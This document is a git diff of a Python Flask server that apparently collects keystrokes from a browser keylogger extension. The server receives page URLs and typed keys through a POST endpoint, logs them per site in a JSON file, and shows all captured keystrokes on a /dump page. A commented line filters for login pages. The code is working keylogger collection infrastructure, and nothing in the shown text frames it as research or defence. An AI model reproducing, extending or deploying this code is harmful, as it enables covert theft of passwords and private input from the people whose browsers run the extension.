@@ -4,20 +4,21 @@
     and corresponding webpage from the keylogger extension.
 """
 import json
-from flask import Flask, request
+from flask import Flask, render_template, request
 from flask_cors import CORS
+# from flask_bootstrap import Bootstrap
 
 APP = Flask(__name__)
+# bs = Bootstrap(APP)
 CORS(APP)
 
 def check_log_exists_and_create_log():
-    print("Checking")
     try:
         logfile = open("log.json")
     except FileNotFoundError:
         print("No log file, creating log")
         logfile = open("log.json", "w")
-        empty_log = {}
+        empty_log = {'sites' : []}
         logfile.write(json.dumps(empty_log))
         logfile.close()
 
@@ -31,18 +32,25 @@ def check_log_exists_and_create_log():
 @APP.route("/keylogger", methods=["POST"])
 def recieve_log():
     request_body = request.get_json()
-    url = request_body["page"]
-    key = request_body["key"]
+    url = request_body['page']
+    key = request_body['key']
 
     check_log_exists_and_create_log()
 
     # if "login" in url:
     with open("log.json") as logfile:
         log = json.load(logfile)
-        if url in log.keys():
-            log[url] += key
-        else:
-            log[url] = key
+        sites = log['sites']
+        matched = False
+        for site in sites:
+            if site['url'] == url:
+                site['keystrokes'] += key
+                matched = True
+        if not matched:
+            sites.append({
+                'url' : url,
+                'keystrokes' : key
+            })
 
     json_object = json.dumps(log, indent = 4)
     with open("log.json", "w") as logfile:
@@ -59,25 +67,9 @@ def recieve_log():
 """
 @APP.route("/dump", methods=["GET"])
 def dump_log():
-    dump = """
-    <html>
-        <head>
-            <title>Keylogger Dump</title>
-        </head>
-        <body>
-    """
     with open("log.json") as logfile:
         log = json.load(logfile)
-        for url in log.keys():
-            dump += """
-            <h1>{0}</h1>
-            {1}
-            """.format(url, log[url])
-    dump += """
-        </body>
-    </html>
-    """
-    return dump
+    return render_template('dump.html', sites=log['sites'])
 
 if __name__ == "__main__":
     APP.run(debug=False, port=5000)
